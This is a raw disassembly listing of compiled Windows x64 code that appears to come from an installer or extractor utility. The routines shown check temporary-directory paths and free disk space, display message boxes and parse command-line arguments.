   140006d20:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006d25:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140006d29:	e8 e6 01 00 00       	call   0x140006f14
   140006d2e:	85 c0                	test   %eax,%eax
   140006d30:	0f 84 45 fc ff ff    	je     0x14000697b
   140006d36:	e9 ad fd ff ff       	jmp    0x140006ae8
   140006d3b:	41 8b c6             	mov    %r14d,%eax
   140006d3e:	eb 26                	jmp    0x140006d66
   140006d40:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140006d45:	4c 8d 0d 24 c9 ff ff 	lea    -0x36dc(%rip),%r9        # 0x140003670
   140006d4c:	45 33 c0             	xor    %r8d,%r8d
   140006d4f:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140006d54:	ba d2 07 00 00       	mov    $0x7d2,%edx
   140006d59:	e8 ca 0f 00 00       	call   0x140007d28
   140006d5e:	48 85 c0             	test   %rax,%rax
   140006d61:	0f 95 c3             	setne  %bl
   140006d64:	8b c3                	mov    %ebx,%eax
   140006d66:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140006d6a:	48 33 cc             	xor    %rsp,%rcx
   140006d6d:	e8 7e 19 00 00       	call   0x1400086f0
   140006d72:	4c 8d 9c 24 60 01 00 	lea    0x160(%rsp),%r11
   140006d79:	00 
   140006d7a:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140006d7e:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140006d82:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   140006d86:	4d 8b 63 38          	mov    0x38(%r11),%r12
   140006d8a:	49 8b e3             	mov    %r11,%rsp
   140006d8d:	41 5f                	pop    %r15
   140006d8f:	41 5e                	pop    %r14
   140006d91:	5d                   	pop    %rbp
   140006d92:	c3                   	ret
   140006d93:	cc                   	int3
   140006d94:	cc                   	int3
   140006d95:	cc                   	int3
   140006d96:	cc                   	int3
   140006d97:	cc                   	int3
   140006d98:	cc                   	int3
   140006d99:	cc                   	int3
   140006d9a:	cc                   	int3
   140006d9b:	cc                   	int3
   140006d9c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006da1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006da6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006dab:	57                   	push   %rdi
   140006dac:	48 83 ec 40          	sub    $0x40,%rsp
   140006db0:	48 8b e9             	mov    %rcx,%rbp
   140006db3:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   140006db7:	48 ff c7             	inc    %rdi
   140006dba:	80 3c 0f 00          	cmpb   $0x0,(%rdi,%rcx,1)
   140006dbe:	75 f7                	jne    0x140006db7
   140006dc0:	83 c7 14             	add    $0x14,%edi
   140006dc3:	b9 40 00 00 00       	mov    $0x40,%ecx
   140006dc8:	8b d7                	mov    %edi,%edx
   140006dca:	8b df                	mov    %edi,%ebx
   140006dcc:	48 ff 15 15 26 00 00 	rex.W call *0x2615(%rip)        # 0x1400093e8
   140006dd3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006dd8:	48 8b f0             	mov    %rax,%rsi
   140006ddb:	48 85 c0             	test   %rax,%rax
   140006dde:	75 41                	jne    0x140006e21
   140006de0:	21 44 24 28          	and    %eax,0x28(%rsp)
   140006de4:	45 33 c9             	xor    %r9d,%r9d
   140006de7:	45 33 c0             	xor    %r8d,%r8d
   140006dea:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006df1:	00 
   140006df2:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140006df7:	33 c9                	xor    %ecx,%ecx
   140006df9:	e8 2e e1 ff ff       	call   0x140004f2c
   140006dfe:	e8 55 0b 00 00       	call   0x140007958
   140006e03:	89 05 3b 67 00 00    	mov    %eax,0x673b(%rip)        # 0x14000d544
   140006e09:	33 c0                	xor    %eax,%eax
   140006e0b:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140006e10:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140006e15:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140006e1a:	48 83 c4 40          	add    $0x40,%rsp
   140006e1e:	5f                   	pop    %rdi
   140006e1f:	c3                   	ret
   140006e20:	cc                   	int3
   140006e21:	48 8d 47 ff          	lea    -0x1(%rdi),%rax
   140006e25:	ba fe ff ff 7f       	mov    $0x7ffffffe,%edx
   140006e2a:	48 3b c2             	cmp    %rdx,%rax
   140006e2d:	77 38                	ja     0x140006e67
   140006e2f:	48 2b d3             	sub    %rbx,%rdx
   140006e32:	4c 8b c5             	mov    %rbp,%r8
   140006e35:	4c 2b c6             	sub    %rsi,%r8
   140006e38:	48 8b ce             	mov    %rsi,%rcx
   140006e3b:	48 8d 04 1a          	lea    (%rdx,%rbx,1),%rax
   140006e3f:	48 85 c0             	test   %rax,%rax
   140006e42:	74 13                	je     0x140006e57
   140006e44:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   140006e48:	84 c0                	test   %al,%al
   140006e4a:	74 0b                	je     0x140006e57
   140006e4c:	88 01                	mov    %al,(%rcx)
   140006e4e:	48 ff c1             	inc    %rcx
   140006e51:	48 83 eb 01          	sub    $0x1,%rbx
   140006e55:	75 e4                	jne    0x140006e3b
   140006e57:	48 85 db             	test   %rbx,%rbx
   140006e5a:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140006e5e:	48 0f 45 c1          	cmovne %rcx,%rax
   140006e62:	c6 00 00             	movb   $0x0,(%rax)
   140006e65:	eb 07                	jmp    0x140006e6e
   140006e67:	85 ff                	test   %edi,%edi
   140006e69:	74 03                	je     0x140006e6e
   140006e6b:	c6 06 00             	movb   $0x0,(%rsi)
   140006e6e:	4c 8d 05 9b 2b 00 00 	lea    0x2b9b(%rip),%r8        # 0x140009a10
   140006e75:	8b d7                	mov    %edi,%edx
   140006e77:	48 8b ce             	mov    %rsi,%rcx
   140006e7a:	e8 89 0f 00 00       	call   0x140007e08
   140006e7f:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140006e85:	45 33 c9             	xor    %r9d,%r9d
   140006e88:	c7 44 24 28 80 00 00 	movl   $0x4000080,0x28(%rsp)
   140006e8f:	04 
   140006e90:	45 33 c0             	xor    %r8d,%r8d
   140006e93:	ba 00 00 00 40       	mov    $0x40000000,%edx
   140006e98:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140006e9f:	00 
   140006ea0:	48 8b ce             	mov    %rsi,%rcx
   140006ea3:	48 ff 15 ae 24 00 00 	rex.W call *0x24ae(%rip)        # 0x140009358
   140006eaa:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006eaf:	48 8b ce             	mov    %rsi,%rcx
   140006eb2:	48 8b d8             	mov    %rax,%rbx
   140006eb5:	48 ff 15 d4 23 00 00 	rex.W call *0x23d4(%rip)        # 0x140009290
   140006ebc:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006ec1:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140006ec5:	0f 84 33 ff ff ff    	je     0x140006dfe
   140006ecb:	48 8b cb             	mov    %rbx,%rcx
   140006ece:	48 ff 15 83 23 00 00 	rex.W call *0x2383(%rip)        # 0x140009258
   140006ed5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006eda:	48 8b cd             	mov    %rbp,%rcx
   140006edd:	48 ff 15 44 23 00 00 	rex.W call *0x2344(%rip)        # 0x140009228
   140006ee4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006ee9:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006eec:	0f 84 0c ff ff ff    	je     0x140006dfe
   140006ef2:	a8 10                	test   $0x10,%al
   140006ef4:	0f 84 04 ff ff ff    	je     0x140006dfe
   140006efa:	83 25 43 66 00 00 00 	andl   $0x0,0x6643(%rip)        # 0x14000d544
   140006f01:	b8 01 00 00 00       	mov    $0x1,%eax
   140006f06:	e9 00 ff ff ff       	jmp    0x140006e0b
   140006f0b:	cc                   	int3
   140006f0c:	cc                   	int3
   140006f0d:	cc                   	int3
   140006f0e:	cc                   	int3
   140006f0f:	cc                   	int3
   140006f10:	cc                   	int3
   140006f11:	cc                   	int3
   140006f12:	cc                   	int3
   140006f13:	cc                   	int3
   140006f14:	48 8b c4             	mov    %rsp,%rax
   140006f17:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140006f1b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140006f1f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140006f23:	55                   	push   %rbp
   140006f24:	41 54                	push   %r12
   140006f26:	41 55                	push   %r13
   140006f28:	41 56                	push   %r14
   140006f2a:	41 57                	push   %r15
   140006f2c:	48 8d a8 58 fd ff ff 	lea    -0x2a8(%rax),%rbp
   140006f33:	48 81 ec 80 03 00 00 	sub    $0x380,%rsp
   140006f3a:	48 8b 05 c7 50 00 00 	mov    0x50c7(%rip),%rax        # 0x14000c008
   140006f41:	48 33 c4             	xor    %rsp,%rax
   140006f44:	48 89 85 70 02 00 00 	mov    %rax,0x270(%rbp)
   140006f4b:	45 33 ed             	xor    %r13d,%r13d
   140006f4e:	45 8b e0             	mov    %r8d,%r12d
   140006f51:	44 8b fa             	mov    %edx,%r15d
   140006f54:	48 8b f9             	mov    %rcx,%rdi
   140006f57:	85 d2                	test   %edx,%edx
   140006f59:	75 08                	jne    0x140006f63
   140006f5b:	8d 42 01             	lea    0x1(%rdx),%eax
   140006f5e:	e9 ff 02 00 00       	jmp    0x140007262
   140006f63:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140006f68:	b9 04 01 00 00       	mov    $0x104,%ecx
   140006f6d:	48 ff 15 b4 23 00 00 	rex.W call *0x23b4(%rip)        # 0x140009328
   140006f74:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006f79:	48 8b cf             	mov    %rdi,%rcx
   140006f7c:	48 ff 15 bd 23 00 00 	rex.W call *0x23bd(%rip)        # 0x140009340
   140006f83:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006f88:	33 c9                	xor    %ecx,%ecx
   140006f8a:	85 c0                	test   %eax,%eax
   140006f8c:	75 2d                	jne    0x140006fbb
   140006f8e:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140006f93:	45 33 c9             	xor    %r9d,%r9d
   140006f96:	45 33 c0             	xor    %r8d,%r8d
   140006f99:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006fa0:	00 
   140006fa1:	ba bc 04 00 00       	mov    $0x4bc,%edx
   140006fa6:	e8 81 df ff ff       	call   0x140004f2c
   140006fab:	e8 a8 09 00 00       	call   0x140007958
   140006fb0:	89 05 8e 65 00 00    	mov    %eax,0x658e(%rip)        # 0x14000d544
   140006fb6:	e9 a5 02 00 00       	jmp    0x140007260
   140006fbb:	48 8d 44 24 4c       	lea    0x4c(%rsp),%rax
   140006fc0:	44 89 6c 24 44       	mov    %r13d,0x44(%rsp)
   140006fc5:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140006fca:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006fcf:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140006fd4:	44 89 6c 24 40       	mov    %r13d,0x40(%rsp)
   140006fd9:	48 8d 54 24 44       	lea    0x44(%rsp),%rdx
   140006fde:	44 89 6c 24 48       	mov    %r13d,0x48(%rsp)
   140006fe3:	44 89 6c 24 4c       	mov    %r13d,0x4c(%rsp)
   140006fe8:	48 ff 15 a1 24 00 00 	rex.W call *0x24a1(%rip)        # 0x140009490
   140006fef:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006ff4:	85 c0                	test   %eax,%eax
   140006ff6:	0f 84 de 01 00 00    	je     0x1400071da
   140006ffc:	44 8b 74 24 40       	mov    0x40(%rsp),%r14d
   140007001:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140007007:	44 0f af 74 24 44    	imul   0x44(%rsp),%r14d
   14000700d:	8b 54 24 48          	mov    0x48(%rsp),%edx
   140007011:	41 8b ce             	mov    %r14d,%ecx
   140007014:	48 ff 15 7d 24 00 00 	rex.W call *0x247d(%rip)        # 0x140009498
   14000701b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007020:	8b f0                	mov    %eax,%esi
   140007022:	85 c0                	test   %eax,%eax
   140007024:	0f 84 b0 01 00 00    	je     0x1400071da
   14000702a:	44 89 6c 24 38       	mov    %r13d,0x38(%rsp)
   14000702f:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140007034:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140007039:	45 33 c9             	xor    %r9d,%r9d
   14000703c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007041:	45 33 c0             	xor    %r8d,%r8d
   140007044:	48 8d 44 24 54       	lea    0x54(%rsp),%rax
   140007049:	33 d2                	xor    %edx,%edx
   14000704b:	33 c9                	xor    %ecx,%ecx
   14000704d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007052:	48 ff 15 bf 22 00 00 	rex.W call *0x22bf(%rip)        # 0x140009318
   140007059:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000705e:	85 c0                	test   %eax,%eax
   140007060:	75 5f                	jne    0x1400070c1
   140007062:	bb 00 02 00 00       	mov    $0x200,%ebx
   140007067:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   14000706b:	44 8b c3             	mov    %ebx,%r8d
   14000706e:	33 d2                	xor    %edx,%edx
   140007070:	e8 34 1d 00 00       	call   0x140008da9
   140007075:	e8 de 08 00 00       	call   0x140007958
   14000707a:	89 05 c4 64 00 00    	mov    %eax,0x64c4(%rip)        # 0x14000d544
   140007080:	48 ff 15 99 21 00 00 	rex.W call *0x2199(%rip)        # 0x140009220
   140007087:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000708c:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140007091:	45 33 c9             	xor    %r9d,%r9d
   140007094:	44 8b c0             	mov    %eax,%r8d
   140007097:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000709b:	48 8d 45 70          	lea    0x70(%rbp),%rax
   14000709f:	33 d2                	xor    %edx,%edx
   1400070a1:	b9 00 10 00 00       	mov    $0x1000,%ecx
   1400070a6:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400070ab:	48 ff 15 06 23 00 00 	rex.W call *0x2306(%rip)        # 0x1400093b8
   1400070b2:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400070b7:	ba f9 04 00 00       	mov    $0x4f9,%edx
   1400070bc:	e9 73 01 00 00       	jmp    0x140007234
   1400070c1:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400070c6:	48 ff 15 73 22 00 00 	rex.W call *0x2273(%rip)        # 0x140009340
   1400070cd:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400070d2:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   1400070d8:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1400070dd:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   1400070e2:	48 2b f8             	sub    %rax,%rdi
   1400070e5:	41 8d 48 fb          	lea    -0x5(%r8),%ecx
   1400070e9:	49 8d 40 fc          	lea    -0x4(%r8),%rax
   1400070ed:	48 85 c0             	test   %rax,%rax
   1400070f0:	74 11                	je     0x140007103
   1400070f2:	8a 04 17             	mov    (%rdi,%rdx,1),%al
   1400070f5:	84 c0                	test   %al,%al
   1400070f7:	74 0a                	je     0x140007103
   1400070f9:	88 02                	mov    %al,(%rdx)
   1400070fb:	48 03 d1             	add    %rcx,%rdx
   1400070fe:	4c 2b c1             	sub    %rcx,%r8
   140007101:	75 e6                	jne    0x1400070e9
   140007103:	4d 85 c0             	test   %r8,%r8
   140007106:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   14000710a:	bb 00 02 00 00       	mov    $0x200,%ebx
   14000710f:	48 0f 45 c2          	cmovne %rdx,%rax
   140007113:	44 88 28             	mov    %r13b,(%rax)
   140007116:	41 0f b7 c5          	movzwl %r13w,%eax
   14000711a:	44 3b f3             	cmp    %ebx,%r14d
   14000711d:	74 31                	je     0x140007150
   14000711f:	03 db                	add    %ebx,%ebx
   140007121:	66 03 c1             	add    %cx,%ax
   140007124:	66 83 f8 08          	cmp    $0x8,%ax
   140007128:	72 f0                	jb     0x14000711a
   14000712a:	75 24                	jne    0x140007150
   14000712c:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140007131:	45 33 c9             	xor    %r9d,%r9d
   140007134:	45 33 c0             	xor    %r8d,%r8d
   140007137:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000713e:	00 
   14000713f:	ba c5 04 00 00       	mov    $0x4c5,%edx
   140007144:	33 c9                	xor    %ecx,%ecx
   140007146:	e8 e1 dd ff ff       	call   0x140004f2c
   14000714b:	e9 10 01 00 00       	jmp    0x140007260
   140007150:	f6 05 0d 6d 00 00 08 	testb  $0x8,0x6d0d(%rip)        # 0x14000de64
   140007157:	74 2d                	je     0x140007186
   140007159:	f7 44 24 50 00 80 00 	testl  $0x8000,0x50(%rsp)
   140007160:	00 
   140007161:	74 23                	je     0x140007186
   140007163:	44 8b 05 fe 6c 00 00 	mov    0x6cfe(%rip),%r8d        # 0x14000de68
   14000716a:	48 8d 15 4f 5b 00 00 	lea    0x5b4f(%rip),%rdx        # 0x14000ccc0
   140007171:	0f b7 c0             	movzwl %ax,%eax
   140007174:	41 c1 e8 02          	shr    $0x2,%r8d
   140007178:	8b 14 82             	mov    (%rdx,%rax,4),%edx
   14000717b:	03 d2                	add    %edx,%edx
   14000717d:	44 03 05 e4 6c 00 00 	add    0x6ce4(%rip),%r8d        # 0x14000de68
   140007184:	eb 14                	jmp    0x14000719a
   140007186:	44 8b 05 db 6c 00 00 	mov    0x6cdb(%rip),%r8d        # 0x14000de68
   14000718d:	48 8d 15 2c 5b 00 00 	lea    0x5b2c(%rip),%rdx        # 0x14000ccc0
   140007194:	0f b7 c0             	movzwl %ax,%eax
   140007197:	8b 14 82             	mov    (%rdx,%rax,4),%edx
   14000719a:	41 8b c7             	mov    %r15d,%eax
   14000719d:	83 e0 03             	and    $0x3,%eax
   1400071a0:	3c 03                	cmp    $0x3,%al
   1400071a2:	75 1a                	jne    0x1400071be
   1400071a4:	41 8d 04 10          	lea    (%r8,%rdx,1),%eax
   1400071a8:	3b c6                	cmp    %esi,%eax
   1400071aa:	76 20                	jbe    0x1400071cc
   1400071ac:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   1400071b1:	41 8b cc             	mov    %r12d,%ecx
   1400071b4:	e8 67 b3 ff ff       	call   0x140002520
   1400071b9:	e9 a4 00 00 00       	jmp    0x140007262
   1400071be:	44 84 f9             	test   %r15b,%cl
   1400071c1:	74 04                	je     0x1400071c7
   1400071c3:	3b d6                	cmp    %esi,%edx
   1400071c5:	eb e3                	jmp    0x1400071aa
   1400071c7:	44 3b c6             	cmp    %esi,%r8d
   1400071ca:	eb de                	jmp    0x1400071aa
   1400071cc:	44 89 2d 71 63 00 00 	mov    %r13d,0x6371(%rip)        # 0x14000d544
   1400071d3:	8b c1                	mov    %ecx,%eax
   1400071d5:	e9 88 00 00 00       	jmp    0x140007262
   1400071da:	bb 00 02 00 00       	mov    $0x200,%ebx
   1400071df:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   1400071e3:	44 8b c3             	mov    %ebx,%r8d
   1400071e6:	33 d2                	xor    %edx,%edx
   1400071e8:	e8 bc 1b 00 00       	call   0x140008da9
   1400071ed:	e8 66 07 00 00       	call   0x140007958
   1400071f2:	89 05 4c 63 00 00    	mov    %eax,0x634c(%rip)        # 0x14000d544
   1400071f8:	48 ff 15 21 20 00 00 	rex.W call *0x2021(%rip)        # 0x140009220
   1400071ff:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007204:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140007209:	45 33 c9             	xor    %r9d,%r9d
   14000720c:	44 8b c0             	mov    %eax,%r8d
   14000720f:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140007213:	48 8d 45 70          	lea    0x70(%rbp),%rax
   140007217:	33 d2                	xor    %edx,%edx
   140007219:	b9 00 10 00 00       	mov    $0x1000,%ecx
   14000721e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007223:	48 ff 15 8e 21 00 00 	rex.W call *0x218e(%rip)        # 0x1400093b8
   14000722a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000722f:	ba b0 04 00 00       	mov    $0x4b0,%edx
   140007234:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140007239:	4c 8d 4d 70          	lea    0x70(%rbp),%r9
   14000723d:	4c 8b c7             	mov    %rdi,%r8
   140007240:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140007247:	00 
   140007248:	33 c9                	xor    %ecx,%ecx
   14000724a:	e8 dd dc ff ff       	call   0x140004f2c
   14000724f:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140007254:	48 ff 15 e5 20 00 00 	rex.W call *0x20e5(%rip)        # 0x140009340
   14000725b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007260:	33 c0                	xor    %eax,%eax
   140007262:	48 8b 8d 70 02 00 00 	mov    0x270(%rbp),%rcx
   140007269:	48 33 cc             	xor    %rsp,%rcx
   14000726c:	e8 7f 14 00 00       	call   0x1400086f0
   140007271:	4c 8d 9c 24 80 03 00 	lea    0x380(%rsp),%r11
   140007278:	00 
   140007279:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   14000727d:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140007281:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   140007285:	49 8b e3             	mov    %r11,%rsp
   140007288:	41 5f                	pop    %r15
   14000728a:	41 5e                	pop    %r14
   14000728c:	41 5d                	pop    %r13
   14000728e:	41 5c                	pop    %r12
   140007290:	5d                   	pop    %rbp
   140007291:	c3                   	ret
   140007292:	cc                   	int3
   140007293:	cc                   	int3
   140007294:	cc                   	int3
   140007295:	cc                   	int3
   140007296:	cc                   	int3
   140007297:	cc                   	int3
   140007298:	cc                   	int3
   140007299:	cc                   	int3
   14000729a:	cc                   	int3
   14000729b:	cc                   	int3
   14000729c:	8a 01                	mov    (%rcx),%al
   14000729e:	45 33 c0             	xor    %r8d,%r8d
   1400072a1:	4c 8b da             	mov    %rdx,%r11
   1400072a4:	4c 8b d1             	mov    %rcx,%r10
   1400072a7:	84 c0                	test   %al,%al
   1400072a9:	74 1a                	je     0x1400072c5
   1400072ab:	4c 8b c9             	mov    %rcx,%r9
   1400072ae:	3c 20                	cmp    $0x20,%al
   1400072b0:	74 06                	je     0x1400072b8
   1400072b2:	2c 09                	sub    $0x9,%al
   1400072b4:	3c 04                	cmp    $0x4,%al
   1400072b6:	77 0d                	ja     0x1400072c5
   1400072b8:	49 ff c1             	inc    %r9
   1400072bb:	41 ff c0             	inc    %r8d
   1400072be:	41 8a 01             	mov    (%r9),%al
   1400072c1:	84 c0                	test   %al,%al
   1400072c3:	75 e9                	jne    0x1400072ae
   1400072c5:	4d 63 c8             	movslq %r8d,%r9
   1400072c8:	4d 03 ca             	add    %r10,%r9
   1400072cb:	41 80 39 00          	cmpb   $0x0,(%r9)
   1400072cf:	75 04                	jne    0x1400072d5
   1400072d1:	33 c0                	xor    %eax,%eax
   1400072d3:	c3                   	ret
   1400072d4:	cc                   	int3
   1400072d5:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   1400072d9:	48 ff c1             	inc    %rcx
   1400072dc:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   1400072e1:	75 f6                	jne    0x1400072d9
   1400072e3:	83 e9 01             	sub    $0x1,%ecx
   1400072e6:	48 63 d1             	movslq %ecx,%rdx
   1400072e9:	78 16                	js     0x140007301
   1400072eb:	41 8a 04 11          	mov    (%r9,%rdx,1),%al
   1400072ef:	3c 20                	cmp    $0x20,%al
   1400072f1:	74 06                	je     0x1400072f9
   1400072f3:	2c 09                	sub    $0x9,%al
   1400072f5:	3c 04                	cmp    $0x4,%al
   1400072f7:	77 08                	ja     0x140007301
   1400072f9:	ff c9                	dec    %ecx
   1400072fb:	48 83 ea 01          	sub    $0x1,%rdx
   1400072ff:	79 ea                	jns    0x1400072eb
   140007301:	41 03 c8             	add    %r8d,%ecx
   140007304:	45 89 03             	mov    %r8d,(%r11)
   140007307:	48 63 d1             	movslq %ecx,%rdx
   14000730a:	b8 01 00 00 00       	mov    $0x1,%eax
   14000730f:	42 c6 44 12 01 00    	movb   $0x0,0x1(%rdx,%r10,1)
   140007315:	c3                   	ret
   140007316:	cc                   	int3
   140007317:	cc                   	int3
   140007318:	cc                   	int3
   140007319:	cc                   	int3
   14000731a:	cc                   	int3
   14000731b:	cc                   	int3
   14000731c:	cc                   	int3
   14000731d:	cc                   	int3
   14000731e:	cc                   	int3
   14000731f:	cc                   	int3
   140007320:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007325:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000732a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000732f:	55                   	push   %rbp
   140007330:	41 54                	push   %r12
   140007332:	41 55                	push   %r13
   140007334:	41 56                	push   %r14
   140007336:	41 57                	push   %r15
   140007338:	48 8d 6c 24 a0       	lea    -0x60(%rsp),%rbp
   14000733d:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   140007344:	48 8b 05 bd 4c 00 00 	mov    0x4cbd(%rip),%rax        # 0x14000c008
   14000734b:	48 33 c4             	xor    %rsp,%rax
   14000734e:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140007352:	45 33 ff             	xor    %r15d,%r15d
   140007355:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   14000735b:	4c 8b f1             	mov    %rcx,%r14
   14000735e:	41 8b f4             	mov    %r12d,%esi
   140007361:	48 85 c9             	test   %rcx,%rcx
   140007364:	0f 84 b0 05 00 00    	je     0x14000791a
   14000736a:	44 38 39             	cmp    %r15b,(%rcx)
   14000736d:	0f 84 a7 05 00 00    	je     0x14000791a
   140007373:	41 8d 7c 24 01       	lea    0x1(%r12),%edi
   140007378:	41 bd 04 01 00 00    	mov    $0x104,%r13d
   14000737e:	85 f6                	test   %esi,%esi
   140007380:	0f 84 bf 00 00 00    	je     0x140007445
   140007386:	41 80 3e 20          	cmpb   $0x20,(%r14)
   14000738a:	74 09                	je     0x140007395
   14000738c:	41 8a 06             	mov    (%r14),%al
   14000738f:	2c 09                	sub    $0x9,%al
   140007391:	3c 04                	cmp    $0x4,%al
   140007393:	77 14                	ja     0x1400073a9
   140007395:	49 8b ce             	mov    %r14,%rcx
   140007398:	48 ff 15 a9 21 00 00 	rex.W call *0x21a9(%rip)        # 0x140009548
   14000739f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400073a4:	4c 8b f0             	mov    %rax,%r14
   1400073a7:	eb dd                	jmp    0x140007386
   1400073a9:	45 38 3e             	cmp    %r15b,(%r14)
   1400073ac:	0f 84 93 00 00 00    	je     0x140007445
   1400073b2:	49 8b cf             	mov    %r15,%rcx
   1400073b5:	45 8b c7             	mov    %r15d,%r8d
   1400073b8:	45 8b cf             	mov    %r15d,%r9d
   1400073bb:	41 8b d4             	mov    %r12d,%edx
   1400073be:	45 85 c0             	test   %r8d,%r8d
   1400073c1:	75 0f                	jne    0x1400073d2
   1400073c3:	41 8a 06             	mov    (%r14),%al
   1400073c6:	3c 20                	cmp    $0x20,%al
   1400073c8:	74 60                	je     0x14000742a
   1400073ca:	2c 09                	sub    $0x9,%al
   1400073cc:	3c 04                	cmp    $0x4,%al
   1400073ce:	76 5a                	jbe    0x14000742a
   1400073d0:	eb 05                	jmp    0x1400073d7
   1400073d2:	45 85 c9             	test   %r9d,%r9d
   1400073d5:	75 53                	jne    0x14000742a
   1400073d7:	41 8a 06             	mov    (%r14),%al
   1400073da:	3c 22                	cmp    $0x22,%al
   1400073dc:	75 2e                	jne    0x14000740c
   1400073de:	41 38 46 01          	cmp    %al,0x1(%r14)
   1400073e2:	74 0f                	je     0x1400073f3
   1400073e4:	45 85 c0             	test   %r8d,%r8d
   1400073e7:	75 05                	jne    0x1400073ee
   1400073e9:	45 8b c4             	mov    %r12d,%r8d
   1400073ec:	eb 31                	jmp    0x14000741f
   1400073ee:	45 8b cc             	mov    %r12d,%r9d
   1400073f1:	eb 2c                	jmp    0x14000741f
   1400073f3:	41 3b d5             	cmp    %r13d,%edx
   1400073f6:	0f 83 e2 03 00 00    	jae    0x1400077de
   1400073fc:	41 03 d4             	add    %r12d,%edx
   1400073ff:	c6 44 0c 40 22       	movb   $0x22,0x40(%rsp,%rcx,1)
   140007404:	49 03 cc             	add    %r12,%rcx
   140007407:	48 8b c7             	mov    %rdi,%rax
   14000740a:	eb 16                	jmp    0x140007422
   14000740c:	41 3b d5             	cmp    %r13d,%edx
   14000740f:	0f 83 c9 03 00 00    	jae    0x1400077de
   140007415:	41 03 d4             	add    %r12d,%edx
   140007418:	88 44 0c 40          	mov    %al,0x40(%rsp,%rcx,1)
   14000741c:	49 03 cc             	add    %r12,%rcx
   14000741f:	49 8b c4             	mov    %r12,%rax
   140007422:	4c 03 f0             	add    %rax,%r14
   140007425:	45 38 3e             	cmp    %r15b,(%r14)
